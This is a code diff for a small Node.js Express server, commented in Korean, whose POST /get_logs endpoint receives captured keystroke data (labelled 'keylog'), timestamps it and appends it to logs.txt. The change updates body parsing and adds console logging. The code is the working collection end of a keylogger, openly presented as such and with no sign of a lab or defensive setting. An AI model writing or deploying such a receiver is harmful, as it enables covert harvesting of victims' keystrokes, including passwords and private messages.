@@ -1,17 +1,23 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const fs = require('fs');
 const app = express();
 
-app.use(bodyParser.json()); //json 형식으로 받기
+// JSON 형식의 요청 본문을 해석하는 미들웨어
+app.use(express.json());
+
+// // URL-encoded 형식의 요청 본문을 해석하는 미들웨어
+// app.use(express.urlencoded({ extended: true }));
 
 app.post('/get_logs', (req, res) => {
-    const logs = req.body.logs; // 데이터 불러오기
+    let logs = req.body.logs; // 데이터 불러오기
+    console.log(logs)
+    console.log(req.body);
+
     const logEntry = {
         timestamp: new Date().toISOString(), //날짜
         keylog: logs // 키 로그
     };
-    
+
     const logEntryJSON = JSON.stringify(logEntry)+"\n"; // json형식으로 변환 및 줄 바꿈
 
     fs.appendFile('logs.txt', logEntryJSON, (err) => { //logs.txt에 logEntryJSON 저장
@@ -19,6 +25,7 @@ app.post('/get_logs', (req, res) => {
             console.error('Error writing to log file', err);
             res.status(500).send({ result: false }); // 저장 실패시 false 반환
         } else {
+            console.log("success");
             res.send({ result: true }); //저장 성공시 ture 반환
         }
     });
